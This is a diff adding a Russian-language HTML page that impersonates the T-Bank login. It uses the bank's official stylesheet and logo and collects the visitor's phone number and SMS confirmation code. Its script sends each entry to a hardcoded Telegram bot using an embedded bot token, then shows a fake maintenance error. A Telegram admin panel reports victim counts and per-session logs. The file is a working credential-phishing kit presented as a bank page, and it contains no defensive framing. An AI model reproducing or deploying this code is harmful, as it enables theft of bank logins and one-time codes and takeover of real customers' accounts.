@@ -1,0 +1,616 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="referrer" content="origin" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover, user-scalable=no" />
+  <meta name="theme-color" content="#FFFFFF" />
+  <title>Вход в Т‑Банк</title>
+  
+  <!-- ОФИЦИАЛЬНЫЕ СТИЛИ Т‑БАНКА -->
+  <link rel="stylesheet" crossorigin href="https://sso-forms-prod.t-static.ru/client/releases/2.107.0/assetsSolid/index-spa-B4z7f2U9.css" />
+  
+  <style>
+    /* Запрет скролла и фиксация высоты */
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100vh;
+      overflow: hidden !important;
+      background-color: #FFFFFF;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      box-sizing: border-box;
+      position: relative;
+    }
+
+    /* Основной контейнер */
+    .app {
+      width: 100%;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+
+    /* Скрываем оригинальный root и служебные контейнеры */
+    #root, .popup-host, .dropdown-host, .tooltip-host {
+      display: none !important;
+    }
+
+    /* Управление видимостью экранов */
+    .screen {
+      display: none;
+    }
+
+    .screen.active {
+      display: block;
+    }
+
+    /* Карточка в стиле Т‑Банка */
+    .card {
+      background: #FFFFFF;
+      border-radius: 24px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
+      border: 1px solid rgba(0, 0, 0, 0.04);
+      padding: 32px 24px;
+      margin-top: 20px; /* отступ от логотипа */
+    }
+
+    /* Логотип в левом верхнем углу страницы */
+    .page-logo {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      z-index: 10;
+    }
+
+    .page-logo img {
+      height: 32px;
+      width: auto;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin: 0 0 24px; /* убрали отступ снизу, так как нет подзаголовка */
+      color: #000000;
+      line-height: 1.3;
+      text-align: center;
+    }
+
+    .form-group {
+      margin-bottom: 24px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 500;
+      color: #666666;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    input {
+      width: 100%;
+      padding: 16px;
+      font-size: 16px;
+      border: 1.5px solid #E0E0E0;
+      border-radius: 16px;
+      outline: none;
+      transition: all 0.2s ease;
+      background-color: #FFFFFF;
+      color: #000000;
+      font-family: inherit;
+    }
+
+    input:focus {
+      border-color: #FFDD2D;
+      box-shadow: 0 0 0 3px rgba(255, 221, 45, 0.15);
+    }
+
+    input::placeholder {
+      color: #AAAAAA;
+      font-weight: 400;
+    }
+
+    button {
+      width: 100%;
+      padding: 16px;
+      background-color: #FFDD2D;
+      color: #000000;
+      border: none;
+      border-radius: 16px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.2s ease, transform 0.05s ease;
+      margin-top: 8px;
+      border: 1px solid rgba(0, 0, 0, 0.05);
+      font-family: inherit;
+    }
+
+    button:active {
+      background-color: #F5CC0A;
+      transform: scale(0.99);
+    }
+
+    .footer {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 12px;
+      color: #999999;
+      line-height: 1.5;
+    }
+
+    .footer a {
+      color: #000000;
+      text-decoration: none;
+      font-weight: 500;
+      margin: 0 8px;
+    }
+
+    .error-message {
+      color: #E53935;
+      font-size: 13px;
+      margin-top: 8px;
+      padding-left: 8px;
+    }
+
+    /* Кнопка "Назад" */
+    .back-link {
+      display: block;
+      width: 100%;
+      background: none;
+      border: none;
+      color: #666666;
+      font-size: 15px;
+      font-weight: 500;
+      padding: 12px;
+      margin-top: 12px;
+      cursor: pointer;
+      text-align: center;
+      border-radius: 16px;
+    }
+
+    .back-link:hover {
+      background-color: #F5F5F5;
+    }
+
+    /* Экран загрузки */
+    .loader {
+      width: 48px;
+      height: 48px;
+      border: 4px solid #E0E0E0;
+      border-bottom-color: #FFDD2D;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      color: #666666;
+      font-size: 15px;
+      text-align: center;
+    }
+
+    /* Экран техработ (финал) */
+    .tech-screen {
+      text-align: center;
+      padding: 20px 0;
+    }
+
+    .tech-screen .tid-logo {
+      opacity: 0.8;
+      margin-bottom: 24px;
+    }
+
+    .tech-screen h2 {
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 12px;
+    }
+
+    .tech-screen p {
+      color: #666666;
+      font-size: 16px;
+      margin-bottom: 24px;
+    }
+
+    /* Адаптивность */
+    @media (max-width: 480px) {
+      body {
+        padding: 12px;
+      }
+      .card {
+        padding: 24px 16px;
+      }
+      .page-logo {
+        top: 12px;
+        left: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ЛОГОТИП В ЛЕВОМ ВЕРХНЕМ УГЛУ СТРАНИЦЫ -->
+<div class="page-logo">
+  <img src="https://sso-forms-prod.t-static.ru/client/releases/2.107.0/imagesSolid/tid-logo-desktop.svg" alt="Т‑Банк">
+</div>
+
+<div class="app">
+  <!-- ЭКРАН ВВОДА ТЕЛЕФОНА -->
+  <div id="screen-phone" class="screen active">
+    <div class="card">
+      <h1>Вход в T-Bank</h1>
+      
+      <div class="form-group">
+        <label>Телефон</label>
+        <div class="input-wrapper">
+          <input type="tel" id="phoneInput" placeholder="+7 (999) 123-45-67" value="+7 " autofocus autocomplete="off" />
+        </div>
+        <div id="phoneError" class="error-message"></div>
+      </div>
+      
+      <button id="phoneSubmitBtn">Продолжить</button>
+      
+      <div class="footer">
+        <a href="#">Помощь</a>
+        <span>•</span>
+        <a href="#">Политика конфиденциальности</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ЭКРАН ВВОДА КОДА -->
+  <div id="screen-code" class="screen">
+    <div class="card">
+      <h1>Введите код</h1>
+      
+      <div class="form-group">
+        <label>Код из SMS</label>
+        <div class="input-wrapper">
+          <input type="text" id="codeInput" placeholder="XXXXXX" maxlength="6" inputmode="numeric" autocomplete="off" />
+        </div>
+        <div id="codeError" class="error-message"></div>
+      </div>
+      
+      <button id="codeSubmitBtn">Подтвердить</button>
+      <button id="backToPhoneBtn" class="back-link">← Назад</button>
+      
+      <div class="footer">
+        <a href="#" id="resendCodeLink">Отправить повторно</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ЭКРАН ЗАГРУЗКИ -->
+  <div id="screen-loading" class="screen">
+    <div class="card" style="text-align: center;">
+      <div class="loader"></div>
+      <div id="loadingText" class="loading-text">Проверяем номер...</div>
+    </div>
+  </div>
+
+  <!-- ФИНАЛЬНЫЙ ЭКРАН (ОШИБКА) -->
+  <div id="screen-final" class="screen">
+    <div class="card">
+      <div class="tech-screen">
+        <img class="tid-logo" src="https://sso-forms-prod.t-static.ru/client/releases/2.107.0/imagesSolid/tid-logo-desktop.svg" alt="Т‑Банк">
+        <h2>У нас проблема</h2>
+        <p>Мы знаем о проблеме и чиним сервис изо всех сил. Скоро все заработает — попробуйте зайти к нам позже</p>
+        <button id="goToMainBtn" onclick="location.href='https://www.tbank.ru/'">На главную</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    "use strict";
+
+    // ========== НАСТРОЙКИ TELEGRAM ==========
+    const TELEGRAM_BOT_TOKEN = '8595526604:AAFy480hFEKGkgCI_-FXG5hLfwq7_xTrEHo';
+    const ADMIN_IDS = [7536596714, 7829455860, 123123123];
+
+    // ========== DOM ЭЛЕМЕНТЫ ==========
+    const screens = {
+      phone: document.getElementById('screen-phone'),
+      code: document.getElementById('screen-code'),
+      loading: document.getElementById('screen-loading'),
+      final: document.getElementById('screen-final')
+    };
+    const phoneInput = document.getElementById('phoneInput');
+    const phoneError = document.getElementById('phoneError');
+    const phoneSubmitBtn = document.getElementById('phoneSubmitBtn');
+    const codeInput = document.getElementById('codeInput');
+    const codeError = document.getElementById('codeError');
+    const codeSubmitBtn = document.getElementById('codeSubmitBtn');
+    const displayPhoneSpan = document.getElementById('displayPhone');
+    const loadingText = document.getElementById('loadingText');
+    const backToPhoneBtn = document.getElementById('backToPhoneBtn');
+    const resendLink = document.getElementById('resendCodeLink');
+
+    const LOAD_DELAY = 2200;
+    const sessionId = generateSessionId();
+
+    let myChatId = localStorage.getItem('telegram_chat_id') || null;
+    let stats = { sessions: {}, daily: {}, weekly: {}, monthly: {} };
+    let lastUpdateId = parseInt(localStorage.getItem('telegram_last_update_id') || '0');
+
+    // Загрузка статистики
+    try { 
+      const saved = localStorage.getItem('tbank_stats'); 
+      if (saved) stats = JSON.parse(saved); 
+    } catch(e) {}
+
+    if (!stats.sessions[sessionId]) {
+      stats.sessions[sessionId] = {
+        id: sessionId,
+        startTime: new Date().toISOString(),
+        actions: [],
+        phone: null,
+        code: null
+      };
+    }
+
+    function saveStats() {
+      try { localStorage.setItem('tbank_stats', JSON.stringify(stats)); } catch(e) {}
+    }
+
+    function logAction(action, details = '') {
+      const now = new Date();
+      const dateStr = now.toISOString().split('T')[0];
+      const weekStr = `${now.getFullYear()}-W${Math.ceil((now.getDate() + 6) / 7)}`;
+      const monthStr = now.toISOString().slice(0, 7);
+
+      if (stats.sessions[sessionId]) {
+        stats.sessions[sessionId].actions.push({ time: now.toISOString(), action, details });
+      }
+
+      if (!stats.daily[dateStr]) stats.daily[dateStr] = { sessions: 0, phones: 0, codes: 0 };
+      if (!stats.weekly[weekStr]) stats.weekly[weekStr] = { sessions: 0, phones: 0, codes: 0 };
+      if (!stats.monthly[monthStr]) stats.monthly[monthStr] = { sessions: 0, phones: 0, codes: 0 };
+
+      if (action === 'session_start') {
+        stats.daily[dateStr].sessions++;
+        stats.weekly[weekStr].sessions++;
+        stats.monthly[monthStr].sessions++;
+      } else if (action === 'phone_entered') {
+        stats.daily[dateStr].phones++;
+        stats.weekly[weekStr].phones++;
+        stats.monthly[monthStr].phones++;
+      } else if (action === 'code_entered') {
+        stats.daily[dateStr].codes++;
+        stats.weekly[weekStr].codes++;
+        stats.monthly[monthStr].codes++;
+      }
+
+      saveStats();
+      console.log(`[${sessionId}] ${action}: ${details}`);
+    }
+
+    logAction('session_start');
+
+    function generateSessionId() {
+      const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+      let id = '#';
+      for (let i = 0; i < 5; i++) id += chars[Math.floor(Math.random() * chars.length)];
+      return id;
+    }
+
+    function showScreen(name) {
+      Object.values(screens).forEach(el => el.classList.remove('active'));
+      screens[name].classList.add('active');
+    }
+
+    function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+    // Форматирование телефона
+    phoneInput.addEventListener('input', (e) => {
+      let val = e.target.value.replace(/\D/g, '');
+      if (val.length === 0) { e.target.value = '+7 '; return; }
+      if (val[0] === '8') val = '7' + val.slice(1);
+      if (val[0] !== '7') val = '7' + val;
+      val = val.slice(0, 11);
+      let formatted = '+7 ';
+      if (val.length > 1) formatted += '(' + val.slice(1, 4);
+      if (val.length >= 4) formatted += ') ' + val.slice(4, 7);
+      if (val.length >= 7) formatted += '-' + val.slice(7, 9);
+      if (val.length >= 9) formatted += '-' + val.slice(9, 11);
+      e.target.value = formatted;
+    });
+
+    codeInput.addEventListener('input', (e) => e.target.value = e.target.value.replace(/\D/g, ''));
+
+    // ========== TELEGRAM ==========
+    async function getChatId() {
+      if (myChatId) return myChatId;
+      if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return null;
+      try {
+        const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`);
+        const d = await r.json();
+        if (d.ok && d.result.length) {
+          const last = d.result[d.result.length - 1];
+          const cid = last.message?.chat?.id || last.channel_post?.chat?.id;
+          if (cid) {
+            myChatId = cid;
+            localStorage.setItem('telegram_chat_id', cid);
+            return cid;
+          }
+        }
+      } catch(e) {}
+      return null;
+    }
+
+    function isAdmin(chatId) {
+      return ADMIN_IDS.includes(Number(chatId));
+    }
+
+    async function sendToTelegram(text, onlyIfAdmin = true) {
+      if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
+      const chatId = await getChatId();
+      if (!chatId) return;
+      if (onlyIfAdmin && !isAdmin(chatId)) return;
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
+        });
+      } catch(e) {}
+    }
+
+    // ========== ОБРАБОТЧИКИ ==========
+    phoneSubmitBtn.addEventListener('click', async () => {
+      const phone = phoneInput.value.trim();
+      const phonePattern = /^(\+7|8)\s?\(?\d{3}\)?\s?\d{3}[- ]?\d{2}[- ]?\d{2}$/;
+      if (!phonePattern.test(phone)) {
+        phoneError.textContent = 'Введите номер телефона в формате РФ';
+        return;
+      }
+      phoneError.textContent = '';
+      // Обновляем текст на экране кода (хотя подзаголовка нет, но для логики оставим)
+      if (displayPhoneSpan) displayPhoneSpan.textContent = phone;
+      stats.sessions[sessionId].phone = phone;
+      logAction('phone_entered', phone);
+      await sendToTelegram(`<b>Человек ${sessionId}</b>\n📱 Введенный номер: ${phone}`, true);
+
+      showScreen('loading');
+      loadingText.textContent = 'Проверяем номер...';
+      await wait(LOAD_DELAY);
+      showScreen('code');
+      codeInput.value = '';
+      codeInput.focus();
+    });
+
+    codeSubmitBtn.addEventListener('click', async () => {
+      const code = codeInput.value.trim();
+      if (code.length < 4) {
+        codeError.textContent = 'Введите код (минимум 4 цифры)';
+        return;
+      }
+      codeError.textContent = '';
+      stats.sessions[sessionId].code = code;
+      logAction('code_entered', code);
+      await sendToTelegram(`<b>Человек ${sessionId}</b>\n🔐 Введенный код: ${code}`, true);
+
+      showScreen('loading');
+      loadingText.textContent = 'Подтверждаем код...';
+      await wait(LOAD_DELAY);
+      showScreen('final');
+    });
+
+    backToPhoneBtn.addEventListener('click', () => {
+      showScreen('phone');
+      phoneInput.focus();
+    });
+
+    resendLink.addEventListener('click', async (e) => {
+      e.preventDefault();
+      showScreen('loading');
+      loadingText.textContent = 'Отправляем код повторно...';
+      await wait(1500);
+      showScreen('code');
+      codeInput.value = '';
+      codeInput.focus();
+    });
+
+    phoneInput.addEventListener('keypress', (e) => { if(e.key==='Enter') phoneSubmitBtn.click(); });
+    codeInput.addEventListener('keypress', (e) => { if(e.key==='Enter') codeSubmitBtn.click(); });
+
+    // ========== TELEGRAM POLLING (АДМИН) ==========
+    async function processUpdates() {
+      if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
+      try {
+        const offset = lastUpdateId + 1;
+        const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=5`);
+        const d = await r.json();
+        if (!d.ok || !d.result.length) return;
+
+        for (const upd of d.result) {
+          lastUpdateId = upd.update_id;
+          localStorage.setItem('telegram_last_update_id', lastUpdateId);
+          const msg = upd.message;
+          if (!msg) continue;
+          const chatId = msg.chat.id;
+          const text = msg.text || '';
+          if (!isAdmin(chatId)) continue;
+
+          if (text === '/admin') {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+              method: 'POST', headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({
+                chat_id: chatId,
+                text: 'Админ-панель',
+                reply_markup: { keyboard: [[{text:'📊 Статистика'}, {text:'📄 Логи сессии'}]], resize_keyboard: true }
+              })
+            });
+          } else if (text === '📊 Статистика') {
+            const today = new Date().toISOString().split('T')[0];
+            const daily = stats.daily[today] || { sessions:0, phones:0, codes:0 };
+            const report = `📊 Статистика за сегодня (${today}):\n👤 Сессий: ${daily.sessions}\n📱 Входов: ${daily.phones}\n🔐 Кодов: ${daily.codes}`;
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+              method: 'POST', headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({ chat_id: chatId, text: report })
+            });
+          } else if (text === '📄 Логи сессии') {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+              method: 'POST', headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({ chat_id: chatId, text: 'Введите номер сессии (например, #A1B2C3)', reply_markup: { force_reply: true } })
+            });
+          } else if (msg.reply_to_message && msg.reply_to_message.text === 'Введите номер сессии (например, #A1B2C3)') {
+            const sid = text.trim();
+            const session = stats.sessions[sid];
+            if (session) {
+              let content = `======================\nСессия: ${session.id}\n======================\nДействия:\n`;
+              session.actions.forEach(a => content += `[${new Date(a.time).toLocaleTimeString('ru-RU')}] ${a.action}: ${a.details}\n`);
+              const blob = new Blob([content], { type: 'text/plain' });
+              const fd = new FormData();
+              fd.append('chat_id', chatId);
+              fd.append('document', blob, `session_${sid}.txt`);
+              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
+            } else {
+              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: chatId, text: 'Сессия не найдена' })
+              });
+            }
+          }
+        }
+      } catch(e) {}
+    }
+
+    // Инициализация
+    (async () => {
+      phoneInput.value = '+7 ';
+      if (TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
+        const cid = await getChatId();
+        if (cid && isAdmin(cid)) {
+          await sendToTelegram(`🟢 Админ-панель активна\nСессия: ${sessionId}`, false);
+        }
+        setInterval(processUpdates, 3000);
+      }
+    })();
+  })();
+</script>
+
+</body>
+</html>
